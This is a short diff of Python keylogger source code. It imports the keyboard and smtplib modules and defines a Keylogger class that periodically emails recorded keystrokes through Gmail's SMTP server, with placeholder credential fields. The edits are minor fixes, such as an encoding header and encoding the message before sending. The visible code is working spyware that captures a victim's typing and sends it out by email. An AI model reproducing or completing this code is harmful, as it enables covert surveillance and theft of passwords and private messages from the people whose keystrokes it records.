@@ -1,12 +1,14 @@
+# -*- encoding: utf-8 -*-
 import keyboard
 import smtplib
-
 from threading import Semaphore,Timer
 
 
 SEND_REPORT_EVERY=600
 EMAIL_ADDRESS=""
 EMAIL_PASSWORD=""
+
+
 
 class Keylogger:
     def __init__(self, interval):
@@ -32,7 +34,7 @@ class Keylogger:
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
         server.starttls()
         server.login(email, password)
-        server.sendmail(email, email, message)
+        server.sendmail(email, email, message.encode())
         server.quit()
 
     def report(self):
